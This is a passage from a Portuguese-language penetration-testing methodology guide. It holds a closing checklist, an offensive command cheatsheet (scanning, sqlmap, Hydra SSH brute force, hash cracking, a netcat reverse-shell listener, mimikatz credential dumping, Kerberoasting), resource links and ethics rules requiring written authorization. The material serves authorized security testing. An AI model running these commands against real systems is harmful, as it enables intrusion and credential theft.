- [ ] Integridade verificada (SHA256)
- [ ] Reuni√£o de encerramento agendada
- [ ] Relat√≥rio entregue ao cliente
- [ ] Suporte p√≥s-entrega acordado
- [ ] Lessons learned documentado
- [ ] Changelog atualizado

---

## 8. COMANDOS R√ÅPIDOS (CHEATSHEET)

### Reconhecimento
```bash
nmap -sn 192.168.1.0/24                    # Ping sweep
nmap -p- -T4 target.com                    # Full port scan
nmap -sV -sC -p 1-65535 target.com         # Service detection
theHarvester -d target.com -b all          # Email/subdomain harvest
```

### Web
```bash
nikto -h http://target.com                 # Web vuln scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "http://target.com/page?id=1" --dbs
wpscan --url http://target.com --enumerate ap,u
```

### Exploitation
```bash
msfconsole                                 # Metasploit
searchsploit apache 2.4.49                 # Search exploits
python3 -m http.server 8000                # Serve files
nc -lvnp 4444                              # Reverse shell listener
```

### Post-Exploitation
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'  # TTY shell
find / -perm -4000 2>/dev/null             # SUID binaries
sudo -l                                    # Sudo privileges
cat /etc/crontab                           # Cron jobs
```

### Password Attacks
```bash
hydra -l admin -P rockyou.txt ssh://target.com
john --wordlist=rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

### Active Directory
```bash
.\SharpHound.exe -c All                    # BloodHound collect
.\Rubeus.exe kerberoast                    # Kerberoasting
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
GetUserSPNs.py corp.com/user:pass -request
```

---

## 9. RECURSOS ADICIONAIS

### Wordlists Importantes
```
/usr/share/wordlists/rockyou.txt           # Senhas comuns
/usr/share/wordlists/dirbuster/            # Diret√≥rios web
/usr/share/seclists/                       # SecLists (instalar)
/usr/share/wordlists/metasploit/           # Wordlists Metasploit
```

### Documenta√ß√£o
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **HackTricks:** https://book.hacktricks.xyz/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **GTFOBins:** https://gtfobins.github.io/
- **LOLBAS:** https://lolbas-project.github.io/

### Ferramentas Customizadas (neste repo)
```bash
# OPSEC
~/Documents/Scripts/lib/opsec.sh

# Backup
~/Documents/Scripts/lib/backup_tools.sh

# Relat√≥rios
~/Documents/Scripts/lib/generate_report.sh

# Retestes automatizados
~/Documents/Scripts/ScrpitPentestSH/retestesh/

# Ferramentas Kali
~/Documents/Scripts/Kali/Ferramentas/
```

---

## 10. CONTATOS DE EMERG√äNCIA

```bash
# EM CASO DE PROBLEMAS DURANTE O PENTEST:

1. PARAR IMEDIATAMENTE as atividades
2. Notificar o contato t√©cnico do cliente
3. Notificar o gerente de projeto (seu lado)
4. Documentar o incidente
5. Aguardar instru√ß√µes antes de continuar

# Nunca:
# - Continuar ap√≥s descoberta de problema cr√≠tico n√£o esperado
# - Derrubar sistemas de produ√ß√£o
# - Acessar dados al√©m do escopo
# - Exfiltrar dados sem autoriza√ß√£o expl√≠cita
```

---

## üìå NOTAS FINAIS

- **Legalidade:** NUNCA realize pentest sem autoriza√ß√£o formal por escrito
- **√âtica:** Respeite o escopo, n√£o acesse dados desnecess√°rios
- **OPSEC:** Sempre verifique VPN/DNS antes de qualquer a√ß√£o
- **Backup:** Fa√ßa backup antes e depois de cada engajamento
- **Documenta√ß√£o:** Documente TUDO - comandos, outputs, screenshots
- **Relat√≥rio:** O relat√≥rio √© o produto final, invista tempo nele
- **Aprendizado:** Cada pentest √© uma oportunidade de aprender

---

**√öltima atualiza√ß√£o:** 28 de Novembro de 2025  
**Vers√£o:** 2.0  
**Autor:** Red Team Setup  
**Licen√ßa:** Uso interno apenas

---

